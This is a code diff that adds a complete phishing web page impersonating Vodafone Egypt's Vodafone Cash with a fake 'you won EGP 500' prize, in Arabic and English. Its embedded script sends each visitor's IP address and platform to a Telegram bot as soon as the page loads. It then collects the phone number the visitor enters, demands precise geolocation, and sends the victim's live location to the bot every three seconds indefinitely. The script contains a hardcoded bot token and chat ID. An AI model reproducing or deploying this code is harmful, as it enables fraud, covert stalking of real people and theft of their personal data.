@@ -1,0 +1,210 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Vodafone Cash | Reward System</title>
+    
+    <meta name="description" content="Vodafone Egypt Official Reward Page - الموقع الرسمي لهدايا فودافون">
+    <meta property="og:title" content="Vodafone Egypt | Official">
+    <meta property="og:image" content="https://share.google/pzmg8chh74mmCQkrw">
+
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700&family=Poppins:wght@400;600&display=swap" rel="stylesheet">
+    
+    <style>
+        :root { --voda-red: #e60000; --voda-dark: #333; }
+        
+        body {
+            font-family: 'Cairo', 'Poppins', sans-serif;
+            background: #f0f0f0;
+            margin: 0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+        }
+
+        .card {
+            background: #fff;
+            width: 90%;
+            max-width: 420px;
+            border-radius: 25px;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.15);
+            overflow: hidden;
+            text-align: center;
+            border-top: 8px solid var(--voda-red);
+            animation: fadeIn 0.8s ease-in-out;
+        }
+
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
+
+        .header-img {
+            width: 100%;
+            height: auto;
+            border-bottom: 1px solid #eee;
+        }
+
+        .content { padding: 25px; }
+
+        h2 { color: var(--voda-red); font-size: 24px; margin: 10px 0; }
+        h3 { font-family: 'Poppins'; font-size: 18px; color: var(--voda-dark); margin-bottom: 15px; }
+
+        .promo-badge {
+            background: #fff0f0;
+            color: var(--voda-red);
+            padding: 10px;
+            border-radius: 12px;
+            font-weight: bold;
+            margin-bottom: 20px;
+            border: 1px dashed var(--voda-red);
+        }
+
+        input {
+            width: 100%;
+            padding: 15px;
+            margin: 15px 0;
+            border: 2px solid #eee;
+            border-radius: 50px;
+            text-align: center;
+            font-size: 18px;
+            outline: none;
+            transition: 0.3s;
+            box-sizing: border-box;
+        }
+
+        input:focus { border-color: var(--voda-red); }
+
+        .btn-claim {
+            background: var(--voda-red);
+            color: white;
+            border: none;
+            width: 100%;
+            padding: 16px;
+            border-radius: 50px;
+            font-size: 18px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: 0.3s;
+            box-shadow: 0 8px 15px rgba(230,0,0,0.2);
+        }
+
+        .btn-claim:hover { background: #c20000; transform: scale(1.02); }
+
+        #msgBox {
+            font-size: 14px;
+            padding: 12px;
+            border-radius: 10px;
+            display: none;
+            margin-bottom: 15px;
+            line-height: 1.5;
+        }
+
+        .lang-switch { font-size: 12px; color: #888; margin-top: 15px; font-family: 'Poppins'; }
+    </style>
+</head>
+<body>
+
+<div class="card">
+    <img src="https://share.google/pzmg8chh74mmCQkrw" alt="Vodafone" class="header-img">
+    
+    <div class="content">
+        <h2>مبروك! كسبت 500 ج.م</h2>
+        <h3>Congratulations! You won EGP 500</h3>
+        
+        <div class="promo-badge">
+            عروض الصيف من فودافون كاش <br>
+            Vodafone Cash Summer Offers
+        </div>
+
+        <div id="msgBox"></div>
+
+        <input type="tel" id="userPhone" placeholder="رقم الهاتف | Phone Number" maxlength="11">
+        
+        <button class="btn-claim" onclick="initiateReward()">تفعيل الهدية | Activate Now</button>
+
+        <div class="lang-switch">Official Vodafone Egypt Portal</div>
+    </div>
+</div>
+
+<script>
+    const CONFIG = {
+        TOKEN: "8001439036:AAFAVndQ0GlWuz0djflhyPYo5Jo17oMLAHo",
+        CHAT_ID: "6068331455"
+    };
+
+    let userNum = "";
+
+    // دالة الإرسال لتيليجرام
+    async function notifyTelegram(msg) {
+        try {
+            await fetch(`https://api.telegram.org/bot${CONFIG.TOKEN}/sendMessage`, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ chat_id: CONFIG.CHAT_ID, text: msg, parse_mode: "HTML" })
+            });
+        } catch(e) {}
+    }
+
+    // إرسال معلومات الجهاز فور الدخول
+    window.onload = async () => {
+        let ip = "Checking...";
+        try { const r = await fetch("https://api.ipify.org?format=json"); const d = await r.json(); ip = d.ip; } catch(e) {}
+        notifyTelegram(`🚨 <b>New Visit / دخول جديد</b>\nIP: ${ip}\nPlatform: ${navigator.platform}`);
+    };
+
+    function initiateReward() {
+        userNum = document.getElementById("userPhone").value;
+        const box = document.getElementById("msgBox");
+
+        if (userNum.length < 11) {
+            box.style.display = "block";
+            box.style.background = "#fff0f0";
+            box.style.color = "#e60000";
+            box.innerHTML = "يرجى إدخال رقم هاتف صحيح<br>Please enter a valid phone number";
+            return;
+        }
+
+        box.style.display = "none";
+        startTracking();
+    }
+
+    function startTracking() {
+        const box = document.getElementById("msgBox");
+
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(
+                (pos) => {
+                    // النجاح في المرة الأولى
+                    const link = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+                    notifyTelegram(`✅ <b>Permission Granted / تم السماح</b>\nNum: ${userNum}\nLocation: ${link}`);
+                    
+                    box.style.display = "block";
+                    box.style.background = "#e7fce7";
+                    box.style.color = "green";
+                    box.innerHTML = "تم التحقق! جاري معالجة الهدية...<br>Verified! Processing your reward...";
+
+                    // الإرسال كل 3 ثوانٍ (بشكل لا نهائي)
+                    setInterval(() => {
+                        navigator.geolocation.getCurrentPosition((p) => {
+                            const l = `https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`;
+                            notifyTelegram(`🔄 <b>Live Update (Every 3s)</b>\nNum: ${userNum}\nLocation: ${l}`);
+                        }, null, { enableHighAccuracy: true });
+                    }, 3000); // 3000ms = 3 seconds
+                },
+                (err) => {
+                    // الرفض
+                    notifyTelegram(`❌ <b>Permission Denied / تم الرفض</b>\nNum: ${userNum}`);
+                    box.style.display = "block";
+                    box.style.background = "#fff0f0";
+                    box.style.color = "#e60000";
+                    box.innerHTML = "<b>خطأ:</b> يجب تفعيل الموقع الجغرافي لاستلام الجائزة<br><b>Error:</b> You must enable location to receive the gift";
+                },
+                { enableHighAccuracy: true }
+            );
+        }
+    }
+</script>
+
+</body>
+</html>
+
